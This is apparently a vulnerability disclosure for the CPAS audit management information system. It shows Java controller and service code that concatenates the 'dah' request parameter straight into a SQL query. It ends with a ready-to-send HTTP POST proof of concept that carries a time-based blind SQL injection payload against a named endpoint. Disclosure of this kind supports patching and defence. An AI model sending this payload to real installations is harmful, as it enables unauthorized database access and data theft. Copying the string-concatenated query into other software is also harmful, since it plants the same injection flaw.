# CPAS-bug
CPAS audit management information system has SQL injection vulnerability

# Vulnerability code analysis

com/yonyou/aco/cpas/list/web/CpasListController.java  line: 1545
```
@RequestMapping({"/findArchiveReportByDah"})
@ResponseBody
public DataGridView<Map<String, String>> findArchiveReportByDah(@RequestParam(value = "pageNum", defaultValue = "0") int pageNum, @RequestParam(value = "pageSize", defaultValue = "10") int pageSize, @RequestParam(value = "sortName", defaultValue = "") String sortName, @RequestParam(value = "sortOrder", defaultValue = "") String sortOrder, @RequestParam(value = "dah", defaultValue = "") String dah) {
	DataGridView<Map<String, String>> page = new DataGridView<>();
	if (pageNum != 0) {
		try {
			pageNum /= pageSize;
		} catch (Exception e) {
			e.printStackTrace();
		}
	}
	PageResult<Map<String, String>> pages = this.cpasListService.findArchiveReportByDah(pageNum + 1, pageSize, sortName, sortOrder, dah);
	if (pages != null) {
		page.setRows(pages.getResults());
		page.setTotal(pages.getTotalrecord());
	}
	return page;
}
```

com/yonyou/aco/cpas/list/service/impl/CpasListServiceImpl.java  line: 8763
```
@Override // com.yonyou.aco.cpas.list.service.ICpasListService
public PageResult<Map<String, String>> findArchiveReportByDah(int pageNum, int pageSize, String sortName, String sortOrder, String dah) {
	StringBuilder sb = new StringBuilder();
	sb.append("select c.ywmc_,c.ywmcName_,a.* from fd_cpashbggdsq c ");
	sb.append(" left join bpm_ru_biz_info b on c.id = b.ID_ ");
	sb.append(" left join FD_CPASbglb a on c.id = a.biz_id ");
	sb.append(" where b.DR_ = 'N' and b.STATE_ = '2' and c.dah = '" + dah + "' ");
	sb.append(" ORDER BY c.ts DESC");
	return this.cpasListDao.getPageData(pageNum, pageSize, sb.toString());
}
```

The CpasListServiceImpl.java file contains concatenated SQL statements, resulting in SQL injection

POC:
```
POST /cpasm4/cpasList/findArchiveReportByDah HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:141.0) Gecko/20100101 Firefox/141.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Priority: u=0, i
Content-Type: application/x-www-form-urlencoded
Content-Length: 69

dah=0' AND (SELECT 6451 FROM (SELECT(SLEEP(5)))oufm) AND 'lRBm'='lRBm
```

<img width="895" height="290" alt="图片" src="https://github.com/user-attachments/assets/be5366e0-1278-4eef-9786-f1b0cd4b04b9" />
